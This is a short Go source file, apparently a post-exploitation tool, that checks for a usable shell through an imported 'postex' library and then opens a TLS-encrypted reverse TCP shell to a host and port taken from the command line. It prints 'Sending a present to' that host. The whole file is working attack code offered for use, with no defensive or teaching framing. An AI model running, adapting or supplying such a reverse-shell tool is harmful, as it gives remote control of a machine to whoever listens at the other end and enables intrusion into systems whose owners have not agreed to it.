package main
//Open a netcat-style encrypted reverse shell over TCP.

import "fmt"
import "strconv"
import "os"
import "postex"

func main() {
	//perform OS detection and check for a valid shell
	filepath := postex.CheckShell()
	//input handling
	if len(os.Args) < 3 {
		fmt.Println("SYNTAX:", os.Args[0], "[target] [port]")
		return
	}
	host := os.Args[1]
	port,err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("SYNTAX:", os.Args[0], "[target] [port]")
		return
	}
	//let's do it!
	fmt.Println("Sending a present to", host + ":" + os.Args[2])
	postex.ReverseTCPShellTLS(filepath, host, port)
}
